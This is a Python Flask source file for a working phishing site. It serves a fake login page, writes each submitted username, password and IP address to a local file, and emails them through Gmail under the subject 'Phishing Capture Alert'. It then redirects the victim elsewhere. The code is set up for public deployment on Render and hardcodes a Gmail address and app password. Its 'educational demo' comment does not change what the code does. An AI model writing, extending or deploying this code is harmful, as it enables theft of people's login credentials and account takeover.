# app.py

from flask import Flask, render_template, request, redirect, url_for
import smtplib
from email.mime.text import MIMEText
import os # For accessing environment variables
from datetime import datetime # For adding timestamps to logs

app = Flask(__name__)

# --- IMPORTANT SECURITY NOTE ---
# NEVER hardcode sensitive credentials like passwords directly in your code
# for production environments. Use environment variables or a secure
# configuration management system.
# For this educational demo, you will put your actual Gmail App Password here.
# -------------------------------

# Your controlled email address
EMAIL_ADDRESS = "mwananchihuslerloans@gmail.com"
# Your Gmail App Password (ENSURE NO SPACES)
# You confirmed 'mokasgadsacljec' works, so use that without spaces.
EMAIL_PASSWORD = "mokasgadsacljec" # <--- CRITICAL: NO SPACES HERE
TO_EMAIL = "mwananchihuslerloans@gmail.com" # Recipient email

@app.route("/")
def home():
    # This route will serve your login page (e.g., login.html)
    # Ensure you have a 'templates' folder with 'login.html' inside it.
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    username = request.form["username"]
    password = request.form["password"]

    # --- Credential Logging to file (for demonstration only) ---
    # On Render, this file might not be persistent across restarts.
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        ip_address = request.environ.get('REMOTE_ADDR', 'Unknown IP') # Get client IP
        with open("credentials.txt", "a") as f:
            f.write(f"[{timestamp}] IP: {ip_address} - User: {username} | Pass: {password}\n")
        print(f"Credentials saved to credentials.txt: {username} | {password}")
    except Exception as e:
        print(f"Error saving credentials to file: {e}")
    # --- End Credential Logging ---

    # --- Email Notification ---
    try:
        # Connect to Gmail's SMTP server securely over SSL
        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

            subject = "Phishing Capture Alert"
            body = f"New Phishing Attempt:\n\nUsername: {username}\nPassword: {password}\nIP Address: {request.environ.get('REMOTE_ADDR', 'Unknown IP')}\nTimestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"

            msg = MIMEText(body)
            msg['Subject'] = subject
            msg['From'] = EMAIL_ADDRESS
            msg['To'] = TO_EMAIL

            smtp.send_message(msg)
            print("Credentials sent via email successfully!") # This line should appear in Render logs on success

    except Exception as e:
        # If an error occurs during email sending, this will be printed in Render logs
        print(f"Error sending email: {e}")

    # --- Redirect to a page that shows message then auto-redirects to TikTok ---
    # This uses the 'success' route which will render success.html
    return redirect(url_for('success'))

# --- NEW/MODIFIED ROUTE: The success route that renders success.html ---
@app.route("/success")
def success():
    return render_template("success.html")

# --- IMPORTANT FOR RENDER DEPLOYMENT ---
# Your Flask app MUST bind to 0.0.0.0 and use the dynamic PORT provided by Render
# for it to be accessible from the internet.
if __name__ == '__main__':
    # Get the port from the environment variable 'PORT' set by Render.
    # Default to 5000 for local development if 'PORT' is not set.
    port = int(os.environ.get('PORT', 5000))
    
    # Run the Flask app, binding to 0.0.0.0 and the dynamic port.
    # debug=True is good for development but should be False in production.
    app.run(host='0.0.0.0', port=port, debug=True)
